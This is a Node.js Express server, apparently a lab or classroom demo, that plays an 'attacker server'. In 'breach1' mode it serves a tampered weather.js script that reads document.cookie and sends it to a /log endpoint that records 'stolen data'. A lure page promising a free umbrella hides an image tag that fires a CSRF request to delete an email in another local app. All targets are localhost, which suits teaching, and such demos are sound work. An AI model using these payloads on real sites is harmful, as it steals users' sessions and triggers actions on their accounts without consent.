import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 5000;

const versionPath = new URL("version.txt", import.meta.url);
const version = fs.readFileSync(versionPath, "utf-8").trim();

const configPath = new URL("config.json", import.meta.url);
const config = JSON.parse(fs.readFileSync(configPath, "utf8"));

let mode = config.mode;
const args = process.argv;
const modeIndex = args.indexOf("--mode");

if (modeIndex !== -1 && args[modeIndex + 1]) mode = args[modeIndex + 1];
console.log(`[System] Starting ${config.appName} v.${version}...`);


app.get('/log', (req, res) => {
    console.log(`[ATTACKER SERVER] Stolen data received: ${req.query.data}`);
    res.send("Data logged");
});

app.get("/weather.js", (req, res) => {
    if (mode === "breach1") {
        // Скрипт для крадіжки (резулатат видно після перезагрузки сторінки)
        res.type("text/javascript").send(`
            const stolenCookie = document.cookie;
            fetch(\`http://localhost:5000/log?data=\${stolenCookie}\`);
            console.log("Cookie successfully sent to Attacker Server!");
        `);
    } else {
        res.sendFile(path.join(__dirname, "weather.js"));
    }
});

app.get("/weather-promo.html", (req, res) => {
    res.send(`
        <h1>You won a free umbrella!</h1>
        <img src="http://localhost:3000/api/emails/delete/1" style="display:none;">
    `);
});

app.listen(PORT, () => {
    console.log(`[System] Server started in mode "${mode}" on port ${PORT}.`);
})